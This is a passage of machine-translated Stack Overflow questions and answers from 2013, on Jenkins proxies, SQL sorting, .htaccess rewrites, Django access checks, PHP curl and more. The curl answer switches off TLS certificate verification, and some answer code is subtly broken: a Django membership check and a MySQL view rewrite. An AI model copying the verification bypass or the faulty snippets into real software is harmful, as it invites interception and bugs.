我遇到了类似的问题，并怀疑这可能是由于 Jenkins Git 插件中的一个错误，我的公司 Web 代理有问题。

为 http.proxy 和 https.proxy 设置 git config 可以在 shell 中工作，但不适用于 Jenkins Git 插件。

作为一种临时解决方法，我已成功将 SCM 设置为**None**，然后添加了**Execute Shell的****构建步骤**，如下所示：

 **```
if [ -e ".git" ]
then
    git pull
else
    git clone --progress -o origin https://github.com/matthesrieke/nasa-wwj-maven.git .
fi 
```

该脚本只是在第一次构建时克隆 git 存储库，或在后续构建中更新它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-04-11T13:35:26.070

gb96 提供的答案的问题是，每当推送更改时都不会触发作业。

我的机器安装了 linux 并设置了 http_proxy 和 https_proxy 环境变量。我还在 glassfish 上设置了 http.proxyHost 和 http.proxyPort（以及 https 变体）系统属性，甚至尝试使用这些属性集独立运行 jenkins。没有任何效果。我承认我不得不求助于 gb96 的解决方案，直到我发现 jenkins 有一个设置代理的页面......它的位置不是很友好，但只需转到 Jenkins->Manage Jenkins->Manage Plugins 并选择高级选项卡。填写代理主机、端口、用户名（如果有）和密码（如果有），一切顺利。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-05T20:18:35.027

假设您只想让 Jenkins 从 GitHub 拉取您的代码并在本地构建它，请在 Repository URL 字段中使用 GitHub 只读 URL 格式 (git://github.com/user/repo.git)。这样您就不会遇到任何身份验证问题。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-07-04T07:42:03.777

尝试在 Jenkins 中配置这些 GIT 属性。

```
git config --global user.name
git config --global user.email 
```**

# wcf - 无法让我的 wcf web.config 工作

> ID：15232923
> 
> 赞同：0
> 
> 时间：2013-03-05T19:56:43.103
> 
> 标签：wcf, session, web-config

我是 wcf 的菜鸟，我需要一些帮助。

老实说，我对 web.config 文件不太了解，它有很多内容需要考虑。

我有一个 Service.svc.cs 和它的接口 IService.cs 我想创建一个用户可以从客户端登录的登录系统。

```
//Service Contract
[ServiceContract]
public class ItheService
{
    [OperationContract]
    string Login(string email, string password);
}

//interface
public class TheService : ItheService
{
    public string Login(string email, string password)
    {
        //some code
        return "";
    }
} 
```

我阅读了很多页面并尝试了一些不同的 web.config 变体，并得到了关于需要会话的合同的错误。

我知道我需要行为和服务设置，但我不知道该使用什么。

有人可以解释一下我需要在 web.config 文件中添加什么吗？

我最初有这个 web.config，但我知道它错了。

```
<?xml version="1.0"?>
<configuration>
  <system.web>
        <compilation debug="true" targetFramework="4.0" />
  </system.web>
  <system.serviceModel>
    <behaviors>
      <endpointBehaviors>
        <behavior name="httpBehavior">
          <webHttp />
        </behavior>
      </endpointBehaviors>
      <serviceBehaviors>
        <behavior name="">
          <serviceMetadata httpGetEnabled="true" />
          <serviceDebug includeExceptionDetailInFaults="false" />
        </behavior>
      </serviceBehaviors>
    </behaviors>
    <serviceHostingEnvironment multipleSiteBindingsEnabled="true" />
    <services>
      <service name="TheService.theService">
        <endpoint address=""
                     behaviorConfiguration="httpBehavior"
                     binding="webHttpBinding"
                     contract="TheService.ItheService" />
      </service>
    </services>
  </system.serviceModel>
  <system.webServer>
    <modules runAllManagedModulesForAllRequests="true"/>
  </system.webServer>
</configuration> 
```

# jquery - jQuery：SimpleModal 自动调整为窗口大小

> ID：15232927
> 
> 赞同：1
> 
> 时间：2013-03-05T19:56:56.810
> 
> 标签：jquery, jquery-ui, simplemodal

我在 CSS 中将 SimpleModal 设置为屏幕大小的 80%：

```
#simplemodal-container {
    background-color: white;
    border: 4px solid #aaaaaa;
    padding: 12px;
    height: 80%;
    width: 80%;
} 
```

我希望 SimpoleModel 在用户更改窗口大小时根据窗口大小调整大小。

但这不起作用：

```
 $(function () {
        $('#agreement-modal-content').modal(
            {
                autoResize: true,
            }
        );
    }); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-06T00:27:40.293

这是对我有用的解决方案：

```
 $(function() {
        $('#agreement-modal-content').modal(
            {
                autoResize: false,
                onShow: function(dialog) {
                    var h = $(window).height();
                    var w = $(window).width();
                    dialog.container.css('height', '80%');
                    dialog.container.css('width', '80%');
                    var h2 = dialog.container.height();
                    var w2 = dialog.container.width();
                    var top = (h / 2) - (h2 / 2) - h2;
                    var left = (w / 2) - (w2 / 2) - w2;

                    if (top < 60) {
                        top = 60;
                    }

                    if (left < 60) {
                        left = 60;
                    }

                   dialog.container.css('left', left + 'px');
                   dialog.container.css('top', top + 'px');

                }
            }
        );
      }
    ); 
```

# mysql - 按列名降序排列

> ID：15232928
> 
> 赞同：0
> 
> 时间：2013-03-05T19:57:16.013
> 
> 标签：mysql, sorting

我想使用降序对名为“bname”的列或名为“count”的列进行排序

我有这个未排序的代码：

```
SELECT bname FROM brandnames HAVING count(*) > 0 LIMIT 11 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T20:03:13.070

只需像这样添加子句 ORDER BY：

```
ORDER BY bname DESC 
```

DESC 将按后代顺序排列您的结果。您可以删除 DESC，您的结果将上升。

在这里查看更多：[“排序依据”优化](http://dev.mysql.com/doc/refman/5.0/en/order-by-optimization.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-05T19:58:17.333

```
SELECT bname
FROM brandnames
HAVING count(*) > 0 
ORDER BY bname DESC
LIMIT 11 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-05T20:13:42.700

```
 ORDER BY bname DESC 
```

将其附加到 SQL 语句的末尾。

`ORDER BY`特定领域的订单。

`DESC`指下降。这意味着反向字母或反向数字，或反向日期顺序。

取决于类型。删除`DESC`它，它会自动升序。

祝你好运！

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-05T19:58:29.983

利用`ORDER BY _column_ ASC/DESC`

```
SELECT bname FROM brandnames HAVING count(*) > 0 ORDER BY bname DESC LIMIT 11 
```

# php - PHP PCRE - 根据上下文匹配不同的子模式名称

> ID：15232931
> 
> 赞同：1
> 
> 时间：2013-03-05T19:57:25.363
> 
> 标签：php, regex, pcre

正如标题所述，我开始考虑如何匹配，例如，应用于字符串的正则表达式中的 2 个不同的子模式，条件是如果内容只有数字，它将被分配子模式名称`<id>`，否则（字母或字母+ 数字）分配为`<action>`。上下文是我正在编写的 PHP 路由器类。

这是用于匹配包含 words 的操作的条件的一部分：

`(?P<action>[\w]+)`

有任何想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-01-23T14:57:10.553

只需制作 2 个子模式 & OR 他们（`|`）：

```
(?P<id>[\d]+)|(?P<action>[\w]+) 
```

# silverlight - Silverlight ComboBox - 项目子元素的工具提示

> ID：15232935
> 
> 赞同：0
> 
> 时间：2013-03-05T19:57:33.283
> 
> 标签：silverlight, combobox, tooltip

在我的 Silverlight ComboBox 中，每个项目都是一个带有两个元素的水平 StackPanel：一个小形状和一个 TextBlock。该形状有一个工具提示（使用 TooltipService）。当下拉列表打开时，当鼠标光标位于形状上时，我可以看到工具提示。但是，当下拉列表关闭时，我看不到所选项目的工具提示。我可以显示的唯一工具提示是整个 ComboBox 的工具提示。有没有办法让所选项目元素的工具提示保持可见？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T00:56:08.933

我通过制作用户控件解决了我的问题。一个透明的矩形放置在 ComboBox 的顶部，其大小和位置与所选项目的形状相同。当一个项目被选中时，我将工具提示复制到那个透明矩形。对用户来说，工具提示似乎来自形状。我还处理了鼠标单击透明矩形，以打开 ComboBox 的下拉列表。

# c++ - 如何在c++ nds编码中显示图片

> ID：15232937
> 
> 赞同：2
> 
> 时间：2013-03-05T19:57:44.663
> 
> 标签：c++, image, devkitpro

我正在用 devkit pro 为 nds 编写 C++ 代码，而对于我的一生，我不知道如何在其中一个屏幕上绘制/显示全图。只是用于游戏标题屏幕的背景图像。我没有运气搜索过；只找到[这个](https://stackoverflow.com/questions/5410762/drawing-an-image-on-subscreen-of-nds)，它没有显示“hey_typ.h”是什么。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T20:34:55.440

DevkitPro 为支持的目标提供了几个示例。
如果您查看示例\nds\Graphics\Backgrounds\，您会发现两个名为 16bit_color_bmp 和 256_color_bmp 的示例，它们向您展示了如何在主图形核心上显示图像（该核心分配给哪个屏幕是软件可切换的）。

两个示例都使用显示模式 5，将 BG3 设置为 256x256 像素位图。16位模式下的图形数据应该是1555格式（1位alpha，后跟红绿蓝各5位，不记得顺序是rgb还是bgr）。在 256 色模式中，每个像素是（最多）256 色调色板的 8 位索引，其中每个条目是 16 位颜色值（在 1555 格式上）。

如果您想了解有关 NDS 任何部分的详细信息，[GBATEK](http://nocash.emubase.de/gbatek.htm)可能是您最好的选择。

# java - JUnit 测试隔离路由

> ID：15232940
> 
> 赞同：1
> 
> 时间：2013-03-05T19:57:46.983
> 
> 标签：java, apache-camel

我正在创建一个骆驼应用程序。我有一系列通过直接渠道连接的路线。所以...

*   `RouteA`读取`direct:1`和写入`direct:2`
*   `RouteB`读取`direct:2`和写入`direct:3`
*   `RouteC`读取`direct:3`和写入`direct:4`

我正在使用 Java DSL 创建路由。上下文是在 Spring 内部创建的，并且路由使用对 Spring 上下文中的 bean 的引用。

我的问题是，隔离测试每条路线的最佳方法是什么。我可以单独创建每条路线，`RouteBuilder`但春季的上下文将包含所有三个路线构建器，因此无法正常工作。

一种想法是将所有 Spring bean 放在一个上下文文件中，然后使用仅加载单个`RouteBuilder`. 这样做的问题是，如果在配置文件中设置了其他内容`camelContext`（错误处理程序、拦截器等），则可能会出现复制/粘贴错误。

有没有办法创建一个默认的骆驼上下文，链接spring应用程序上下文并加载一个`RouteBuilder`？这与特定于测试的 xml 文件有相同的问题，但至少没有额外的 xml 文件。

还有其他想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T20:29:10.063

如果您只需要对每条路线进行黑盒测试，那么只需使用 Camel 的[AdviceWith](http://camel.apache.org/advicewith.html)支持来隔离每条路线的输入/输出......

特别是查看interceptSendToEndpoint() API ...应该允许您拦截路由之间的消息发送并断言预期的输出等。

# .htaccess - 如何使用 .htacces 将一个 url 重定向到另一个？

> ID：15232944
> 
> 赞同：0
> 
> 时间：2013-03-05T19:58:02.057
> 
> 标签：.htaccess

我有一个像 www.example.com/xyz 这样的网址，我想将其重定向到 www.example.com/abc

xyz 和 abc 可以是一个长字符串，我应该使用什么 .htaccess 规则？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T20:07:21.523

我假设您的内容已永久移动？:) 在这种情况下，最好在您的 .htaccess 文件中使用永久 (301) 重定向规则

```
Redirect permanent /xyz http://www.domain.com/abc 
```

或者

```
Redirect 301 /xyz http://www.domain.com/abc 
```

如果这不能解决您的问题，请指定重定向的性质。乐意效劳！

# django - 仅在所有者或成员时显示项目

> ID：15232954
> 
> 赞同：1
> 
> 时间：2013-03-05T19:58:27.360
> 
> 标签：django, django-models, django-views

在我正在开发的项目管理应用程序中，我希望只有在用户是项目管理员或项目成员时才能显示项目。

下面的视图（当然）不起作用，但它显示了一种检查用户是否是项目管理员的方法。我知道如何检查用户是否是成员的一种方法是使用以下查询：

```
projects = get_list_or_404(Project.objects.filter(users__id__iexact=request.user.id)) 
```

...尽管我不知道如何使用这些（如果应该使用）方法来检查用户是否有权为此目的查看项目，如果不是这样，则不授予访问权限。

怎么可能做到这一点？

**看法：**

```
@login_required
def show_project(request, project_id):
    project = get_object_or_404(Project, pk = project_id)
    tickets = Ticket.objects.filter(project_id = project_id)

    if project.owned_by_user(request.user):
         ???
    elsif

    else:
        message = "You don't have permission to the project"

    return render(request, 'projects/show.html', {"project" : project, "tickets" : tickets, "message": message}) 
```

**模型：**

```
class Project(models.Model):
    ...other fields...
    added_by_user = models.ForeignKey(User)
    users = models.ManyToManyField(User, related_name='projects')  <-- members

    def __unicode__(self):
        return self.name

    def owned_by_user(self, user):
        return self.added_by_user == user 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-05T20:07:20.633

我认为你在正确的轨道上。试一试这段代码——应该会给你一些想法——

```
@login_required
def show_project(request, project_id):
    project = get_object_or_404(Project, pk = project_id)
    tickets = Ticket.objects.filter(project_id = project_id)
    if request.user in project.users.all or project.owned_by_user(request.user):
        return render(request, 'projects/show.html', {"project" : project, "tickets" : tickets})
    else:
        return render(request, 'projects/show.html', {"error_message": "You don't have permission to view the project"}) 
```

然后在你的模板中

```
{% if error_message %}
    <p>{{ error_message }}</p>
{% else %}
   {% for ticket in tickets %}
        <p>{{ ticket }}</p>
   {% endfor %}
    <div>{{ project }}</div>
{% endif %} 
```

# azure-sql-database - 如何：更新 SQL Azure DB、代码优先迁移、TFS 部署

> ID：15232960
> 
> 赞同：7
> 
> 时间：2013-03-05T19:58:33.553
> 
> 标签：azure-sql-database, azure-web-app-service, azure-devops

从 Team Foundation Service（云中的 TFS）部署网站时，是否可以使用 Code First 迁移更新 SQL Azure 数据库？

我能够使用代码和以下命令在本地添加一个新表：

PM>添加迁移...

PM> 更新数据库

当我签入我的代码并且 TFS 将网站部署到 Azure 时，我看不到任何执行这些命令的方法。

Membership Provider 表*正在*创建，但不是我的新表“ExternalUserInformation”。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-07-01T18:46:43.060

在过去的 3 天里，我一直在寻找做到这一点的方法。我找到了这个页面： [http ://architects.dzone.com/articles/continuous-deployment-windows-0](http://architects.dzone.com/articles/continuous-deployment-windows-0)

但直到现在我无法让 WebDeploy 执行代码优先迁移。

如果您找到解决方案，请在此处发布。

最好的问候 Paulo Aboim Pinto 苏黎世 - Suiça

# mysql - 带有子查询的 MySQL 视图

> ID：15232965
> 
> 赞同：1
> 
> 时间：2013-03-05T19:58:45.630
> 
> 标签：mysql, view, subquery

我有以下观点，我需要从 Oracle 移植到 MySQL。这在 Oracle 中完美运行，但在 MySQL 中由于`subquery cannot exist in a view`错误而无法运行。如何转换它以使其在 MySQL 中工作？如果我对此提出另一种看法，它将如何影响性能？可取吗？如果是这样，我该怎么做？如果第二个视图不是一个好主意，如何转换它？谢谢你的帮助！

```
CREATE OR REPLACE VIEW view_name (var1, var2, var3, var4, var5) AS 
SELECT SUM(A.var1a) var1,
        SUM(A.var2a) var2,
        SUM(A.var3a) var3,
        SUM(A.var4a) var4,
        SUM(A.var5a) var5
 FROM (SELECT CASE columnx when 'abc' then COUNT(E.ID) end var1a,
     CASE columnx when 'def' then COUNT(E.ID) end var2a,
     CASE columnx when 'ghi' then COUNT(E.ID) end var3a,
     CASE columnx when 'jkl' then COUNT(E.ID) end var4a,
                    COUNT(E.ID) var5a
             FROM   <list of tables>
            WHERE   <set of conditions>
         GROUP BY   columnx) A; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T20:03:08.407

您应该能够使用以下内容重写它：

```
CREATE OR REPLACE VIEW view_name (var1, var2, var3, var4, var5) AS 
SELECT 
    sum(CASE columnx when 'abc' then 1 else 0 end) var1a,
    sum(CASE columnx when 'def' then 1 else 0 end) end var2a,
    sum(CASE columnx when 'ghi' then 1 else 0 end) end var3a,
    sum(CASE columnx when 'jkl' then 1 else 0 end)end var4a,
    COUNT(E.ID) var5a
FROM   <list of tables>
WHERE   <set of conditions> 
```

# objective-c - 如何在 Objective C 中创建 PKCS12

> ID：15232968
> 
> 赞同：3
> 
> 时间：2013-03-05T19:58:54.097
> 
> 标签：objective-c, macos, cryptography, pkcs#12

我知道有 SecPKCS12Import API 来导入（解析）PKCS12。

如何从 SecIdentityRef + SecCertificateRef 创建 PKCS12？

我正在寻找一种使用本机 API（安全框架）而不是集成 OpenSSL（或其他 3rd 方库）的方法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T23:58:49.070

您正在寻找[SecItemExport](https://developer.apple.com/library/mac/documentation/security/Reference/keychainservices/Reference/reference.html#//apple_ref/c/func/SecItemExport)。

```
CFDataRef exportedData;
OSStatus ret = SecItemExport(arrayWithIdentityAndCert,
                             kSecFormatPKCS12,
                             0, /* Use kSecItemPemArmour to add PEM armor */
                             NULL,
                             &exportedData);

if(ret == errSecSuccess)
{
  /* exportedData now contains your PKCS12 data */
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T21:03:10.133

此外，还有 API SecKeychainItemExport，由 SecItemExport 内部使用。

# php - 动态页面的“正确”方式（查询字符串、URL）

> ID：15232972
> 
> 赞同：0
> 
> 时间：2013-03-05T19:59:01.003
> 
> 标签：php, html, database, dynamic

我有 2 个问题我一直很好奇。

1.  我已经看到查询字符串是一种创建动态页面的方式，通过在它们之间传递一个变量，.php 页面可以通过基于该字符串检索内容来跟进它。查询字符串是做动态网站的最佳和最常见的方法吗？

2.  使用一些 URI，您会看到以下内容

**www.website.com/somepage.php?query_string**

但是你看到的其他一些页面非常干净

**www.website.com/pages/posts/101/title_of_page。**

是什么让 URI 干净而不显示实际查询？

一个非常简单的解释会很棒，或者一个可以描述这一点的网站。非常感谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-05T20:02:16.783

干净的 URL 实际上是被屏蔽的查询字符串，称为“漂亮的永久链接”。大多数情况下，这是通过`.htaccess`文件和`mod_rewrite`; 就像是：

```
RewriteRule pages/(.+) somepage.php/?page=$1 [QSA,L,B] 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-05T20:01:16.223

是什么让 URI 干净而不显示实际查询？

`.htaccess`

[http://httpd.apache.org/docs/2.2/howto/htaccess.html](http://httpd.apache.org/docs/2.2/howto/htaccess.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-05T20:00:51.323

您的第二个示例是对*SEO 友好的*URL。这些天来，除非您有不允许您利用它们的要求，否则这就是要采用的方法。几乎所有现代 CMS 都利用对 SEO 友好的 URL。

将 SEO 友好的 URL 转换为查询字符串由[mod_rewrite](http://httpd.apache.org/docs/current/mod/mod_rewrite.html)处理。这通常在您的站点`vhost`配置中处理，或者可以在`.htaccess`文件中处理。然而，后者效率较低，并且被 Apache 不鼓励。

# mediawiki - 锁定命名空间但保留一页未锁定

> ID：15232975
> 
> 赞同：0
> 
> 时间：2013-03-05T19:59:13.020
> 
> 标签：mediawiki

我正在尝试锁定我的整个“帮助”命名空间，以免被非管理员编辑。但是，我想将一个页面列入白名单，以便非管理员可以编辑它。这一页是支持台。

到目前为止，在我的`LocalSettings.php`文件中，我有：

```
 $wgNamespaceProtection[NS_HELP] = array( 'admins-edit' );
 $wgGroupPermissions['sysop']['admins-edit'] = true; 
```

这成功地阻止了非管理员编辑帮助命名空间中的任何页面。我不知道该怎么做是将一页列入白名单（称为“帮助：支持台”）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-26T19:33:23.333

简单：不要这样做，将其移出命名空间到 Project:Support_Desk ...

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-07-08T07:51:41.053

因此，在您的代码之后，您需要执行以下操作：

`$wgGroupPermissions['user']['edit'] = False;`

`$wgGroupPermissions['user']['read'] = False;`

这不允许任何用户看到任何东西。

然后你做：

`$wgWhitelistRead = array("Main Page", etc.)`

这会将某些页面而不是整个名称空间列入白名单，尽管我找不到同时将两者列入白名单的方法。

# php - php curl -k 或 --insecure, -X

> ID：15232977
> 
> 赞同：48
> 
> 时间：2013-03-05T19:59:16.797
> 
> 标签：php, curl

使用 PHP 和 curl，我需要通过代理连接到 SSL 安全站点，并且忽略证书警告。我的 curl 命令行如下所示：

```
curl -k -u username:password -X GET https://someURL 
```

通过 curl.php，我看到了我认为正确的设置选项。有了他们，我最终得到了这样的结果：

```
 $ch = curl_init("https://someURL");
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); // Ignore cert errors?
  curl_setopt($ch, CURLOPT_PROXY, true);           // Proxy true?
  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");     
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);            
  curl_setopt($ch, CURLOPT_USERPWD, "username:password");      
  $result = curl_exec($ch); 
```

但是，$result 总是返回 false。我的密码中有一个特殊字符“！”。也许我需要逃避它？除此之外，还有其他想法吗？

* * *

## 回答 #1

> 赞同：86
> 
> 时间：2013-03-05T20:01:45.503

要完全禁用 ssl 证书检查 curl 知道该选项`CURLOPT_SSL_VERIFYPEER`。如果将其设置为`false`证书检查将完全被禁用。由于默认值为`true`，您必须添加：

```
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
```

从[PHP 文档](http://www.php.net/manual/en/function.curl-setopt.php)：

> **CURLOPT_SSL_VERIFYPEER** FALSE 阻止 cURL 验证对等方的证书。可以使用 CURLOPT_CAINFO 选项指定要验证的备用证书，或者可以使用 CURLOPT_CAPATH 选项指定证书目录。自 cURL 7.10 起默认为 TRUE。自 cURL 7.10 起安装的默认包。

请注意，如果禁用证书检查，您可以省略该`CURLOPT_SSL_VERIFYHOST`设置。因此可以删除以下行：

```
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); 
```

* * *

您还询问以下设置是否正常：

```
curl_setopt($ch, CURLOPT_PROXY, true); 
```

从[PHP 文档](http://www.php.net/manual/en/function.curl-setopt.php)：

> 用于隧道请求的 HTTP 代理。

意味着如果您使用代理，它会接受像“192.168.0.1:3128”这样的代理地址。`true`在这种情况下没有意义

# java - Spring MVC/Apache Tiles 应用程序中定义的“param”变量在哪里

> ID：15232978
> 
> 赞同：0
> 
> 时间：2013-03-05T19:59:17.570
> 
> 标签：java, spring, spring-mvc, tiles, apache-tiles

带有 Apache Tiles 应用程序的默认启动 Spring MVC 具有预定义的 tagx 文件列表。我发现一个变量 ${param} 到处都在使用，但找不到它定义和启动的地方，请任何人都可以提示它来自哪里？谢谢

例如，来自 language.tagx：

```
<jsp:directive.attribute name="locale" type="java.lang.String" required="true" rtexprvalue="true" description="The locale for the language to be added." />
<jsp:directive.attribute name="label" type="java.lang.String" required="true" rtexprvalue="true" description="The country label for the language to be added." />
<jsp:directive.attribute name="render" type="java.lang.Boolean" required="false" rtexprvalue="true" description="Indicate if the contents of this tag and all enclosed tags should be rendered (default 'true')" />

<c:if test="${empty render or render}">
<spring:url var="img" value="/images/${locale}.png" />
<spring:url var="url" value="">
  <c:if test="${null ne param.form}">
    <spring:param name="form" value="1" />
  </c:if>
  <c:if test="${not empty param.find}">
    <spring:param name="find" value="${param.find}" />
  </c:if>
  <spring:param name="lang" value="${locale}" />
  <c:if test="${not empty param.page}">
    <spring:param name="page" value="${param.page}" />
  </c:if>
  <c:if test="${not empty param.size}">
    <spring:param name="size" value="${param.size}" />
  </c:if>
</spring:url>
<spring:message code="global_language_switch" arguments="${label}" var="lang_label" htmlEscape="false" />
<a href="${url}" title="${fn:escapeXml(lang_label)}">
  <img class="flag" src="${fn:escapeXml(img)}" alt="${fn:escapeXml(lang_label)}" />
</a>
<c:out value=" " />
</c:if> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-05T20:36:02.303

`param`是由[统一表达式语言](http://docs.oracle.com/javaee/5/tutorial/doc/bnahq.html#bnaij)提供的隐式对象。它允许您访问请求参数的值。

# button - MSTest + WatiN 简单按钮单击失败

> ID：15232979
> 
> 赞同：0
> 
> 时间：2013-03-05T19:59:20.510
> 
> 标签：button, visual-studio-2012, mstest, watin

我试图让 MSTest 和 WatiN 一起玩得很好。我有一个简单的示例测试，只需打开谷歌并点击搜索按钮。调试测试时，它按预期工作。在 Visual Studio 2012 中运行测试时，WatiN 脚本无法单击该按钮。似乎找到了按钮，但没有发生单击事件。我尝试过点击并等待和其他一些事情。代码如下：

```
[TestMethod]
public void web2()
{
    bool hasText;
    IE ie = IEStaticInstanceHelper.IE;
    ie.GoTo("http://www.google.com");
    ie.TextField(Find.ByName("q")).TypeText("Dixie");
    Button bt1 = ie.Button(Find.ByName("btnK"));
    bt1.Click();
    hasText = ie.ContainsText("Dixie");
    Assert.IsTrue(hasText, @"The search result does not contain text ""Dixie"".");
} 
```

# java - 在 Java 中识别具有相同内容的图像

> ID：15232982
> 
> 赞同：10
> 
> 时间：2013-03-05T19:59:33.010
> 
> 标签：java, image, comparison

[前段时间，为了回答这个问题](https://stackoverflow.com/questions/8644960/java-library-to-compare-image-similarity/)，我花了一些时间寻找确定两个图像是否相同的方法。我现在面临一个稍微不同的问题：我手头有大约两千张图像，其中一些具有相同的内容，但是彼此的缩放/旋转版本（旋转总是 90° 的倍数），以及问题不同的压缩和图像格式（主要是 jpg，一些 png，仅此而已）。缩放比例不超过大约 2:1。我想做的是消除重复，同时保留最高质量的实例。由于Java是我相当精通的唯一语言，因此我需要使用Java。

[不同问题的答案](https://stackoverflow.com/questions/603283/what-is-the-best-java-image-processing-library-approach)提供了许多有用的链接，但看起来它们中的任何一个都不能在缩放/旋转时识别重复项。

[这个问题连同答案](https://stackoverflow.com/q/225210/1086871)建议首先将所有图像缩放到非常小的尺寸（比如 32*32 或 16*16），然后基本上进行一些散列，并基于散列进行比较。这对我来说听起来很聪明，可以在比较之前对图像进行预排序，在排序之后这将是一个 O(n) 问题。但是，鉴于图像可能会旋转，我不知道如何处理它；一种选择是手动浏览所有图像并决定旋转，因为它们所描绘的内容具有明确的方向（人眼可以很容易地决定应该“向上”的方向）。如果可能的话，我想避免这种情况。

是否有既定的方法/算法（链接提到 SSIM）来处理此类问题，或者你们中的任何人都可以提出比上述更好的方法吗？也许有人知道适合该任务的 Java 库（在链接的问题中提到了 OpenCV 的 Java 包装器，然后是 ImageJ、imgsclr）？任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-06T02:12:59.087

我认为这个问题的一般答案需要一种生成局部不变特征的无监督机器学习方法——基本上，这是一种寻找不随缩放或旋转而变化的散列的奇特方法——然后运行聚类算法。以下是一些可能相关的论文：

*   [在大型集合中聚类近乎重复的图像](http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.88.1514&rep=rep1&type=pdf)
*   [一种新的基于PLSA模型的重复图像检测方法](http://www.ijcte.org/icmv/ICMV2010/095-ICMV2010-W00173.pdf)
*   [基于图像分析的高效图像重复检测](http://infoscience.epfl.ch/record/103736/files/EPFL_TH3797.pdf)- 这里有很多东西，因为这是某个家伙的整个博士论文

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-01-26T17:42:43.163

好吧，我认为 dHash 是您需要的。您只需要改进 dHash 以考虑旋转，这意味着 2000 张图像将被视为 8000 张图像。

就在这几天前，我写了一个纯 Java 库。您可以使用目录路径（包括子目录）来提供它，它会列出列表中的重复图像以及您要删除的绝对路径。或者，您也可以使用它来查找目录中的所有唯一图像。

它在内部使用了 awt api，因此不能用于 Android。由于 imageIO 在读取很多新类型的图像时遇到问题，我正在使用内部使用的 12 个猴子 jar。

[https://github.com/srch07/Duplicate-Image-Finder-API](https://github.com/srch07/Duplicate-Image-Finder-API)

可以从[https://github.com/srch07/Duplicate-Image-Finder-API/blob/master/archives/duplicate_image_finder_1.0.jar下载内部捆绑了依赖项的 Jar](https://github.com/srch07/Duplicate-Image-Finder-API/blob/master/archives/duplicate_image_finder_1.0.jar)

该 api 也可以在不同大小的图像中找到重复项。

# neural-network - 神经网络学习限制

> ID：15232988
> 
> 赞同：0
> 
> 时间：2013-03-05T19:59:51.480
> 
> 标签：neural-network

我想知道是否有办法知道关联神经网络可以学习多少的限制。

我想制作一个简单的网络来识别几个单词，甚至可以纠正它们（如果我输入“betwen”以知道我的意思是“介于”）

如果有人有有趣的文章，请发表。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-05T20:06:26.297

多层前馈神经网络是通用逼近器

[http://en.wikipedia.org/wiki/Universal_approximation_theorem](http://en.wikipedia.org/wiki/Universal_approximation_theorem)

这意味着，使用多层前馈神经网络，您可以使用具有误差 epsilon 的经验函数 F(x) 来逼近任何函数 f(x)。

如果您的输入是带有单词“between”的图像或二进制矩阵，那么您必须使用您的表示设置输入层，并使用您的训练和测试数据的示例进行训练。

一个简单的想法可能是使用 k-means 对输入空间进行聚类以检测字符，应用 ocr 检测并集成单词。

可以开发更复杂的方法，比如 [http://dl2.acm.org/citation.cfm?id=771584](http://dl2.acm.org/citation.cfm?id=771584)

# c# - Membership.DeleteUser 没有删除用户的所有相关行

> ID：15232995
> 
> 赞同：3
> 
> 时间：2013-03-05T20:00:06.720
> 
> 标签：c#, asp.net-mvc-4, simplemembership

`Membership.DeleteUser()`设法删除我正在删除的用户的用户配置文件。为什么它不也删除它存储在`webpages_membership`.

我目前没有使用角色，所以请记住这一点。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-03-05T21:21:28.397

我进行了测试并验证[**SimpleMembershipProvider.DeleteUser**](http://msdn.microsoft.com/en-us/library/webmatrix.webdata.simplemembershipprovider.deleteuser%28v=vs.111%29.aspx)不像宣传的那样工作。根据文档：

> 此方法删除成员帐户表中的条目（默认情况下，**webpages_Membership**）。如果**deleteAllRelatedData**为 true，则存储在用户表中的所有用户数据也将被删除。

但是在我的测试中，我将**deleteAllRelatedData**设置为 true，它只是删除了**UserProfile**表中的条目，而没有触及 pages_membership 中的**条目**。文档中的错误或**SimpleMembership**的实现中的错误。

但我确实找到了解决办法。首先调用[**SimpleMembershipProvider.DeleteAccount**](http://msdn.microsoft.com/en-us/library/webmatrix.webdata.simplemembershipprovider.deleteaccount%28v=vs.111%29.aspx)。这将删除**pages_membership**表中的条目。然后调用**SimpleMembershipProvider.DeleteUser**以删除**UserProfile**表中的条目。这是我用于测试的代码片段。

```
 var roles = (SimpleRoleProvider)Roles.Provider;
    var membership = (SimpleMembershipProvider)Membership.Provider;

    if (!roles.RoleExists("Admin"))
    {
        roles.CreateRole("Admin");
    }
    if (membership.GetUser("test", false) == null)
    {
        membership.CreateUserAndAccount("test", "test");
    }

